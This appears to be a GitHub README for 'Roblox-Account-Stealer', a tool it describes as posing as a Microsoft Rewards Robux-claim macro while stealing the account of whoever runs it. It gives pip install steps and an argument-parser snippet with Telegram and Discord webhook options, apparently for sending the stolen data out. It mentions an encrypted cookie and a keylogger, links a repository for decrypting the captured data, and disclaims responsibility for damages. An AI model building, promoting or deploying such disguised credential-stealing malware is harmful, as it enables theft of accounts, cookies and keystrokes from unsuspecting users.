# Roblox-Account-Stealer
It acts as a macro for the Microsoft Reward Robux claim system but its a Bot that steal your account
Steps to run:
``` pip install argparse json logging pycryptodome selenium pynput webdriver_manager```
Webwook:
```
 parser = argparse.ArgumentParser(description="Microsoft Rewards Farmer")
    parser.add_argument("-v", "--visible", action="store_true", help="Optional: Visible browser")
    parser.add_argument("-l", "--lang", type=str, default=None, help="Optional: Language (e.g., en)")
    parser.add_argument("-g", "--geo", type=str, default=None, help="Optional: Geolocation (e.g., US)")
    parser.add_argument("-p", "--proxy", type=str, default=None, help="Optional: Global Proxy")
    parser.add_argument("-t", "--telegram", metavar=("TOKEN", "CHAT_ID"), nargs=2, type=str, default=None, help="Optional: Telegram Bot Token and Chat ID")
    parser.add_argument("-d", "--discord", type=str, default=None, help="Optional: Your discord api")
    return parser.parse_args()
```
Note:
To decrypt the encrypted cookie and keylogger please refer: https://github.com/justanormalhuman12/encryption-v2
If anything happens i wouldnt take any responsibilty for damages.
